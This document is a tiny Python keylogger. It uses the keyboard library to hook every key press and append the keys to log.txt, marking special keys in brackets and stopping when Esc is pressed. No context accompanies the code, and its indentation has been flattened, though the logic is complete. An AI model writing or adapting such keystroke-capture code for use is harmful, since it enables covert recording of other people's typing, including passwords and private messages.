import keyboard

def registrar(evento):
with open("log.txt", "a") as f:
if evento.name == "space":
f.write(" ")
elif len(evento.name) > 1:
f.write(f" [{evento.name.upper()}] ")
else:
f.write(evento.name)

keyboard.on_press(registrar)
keyboard.wait("esc")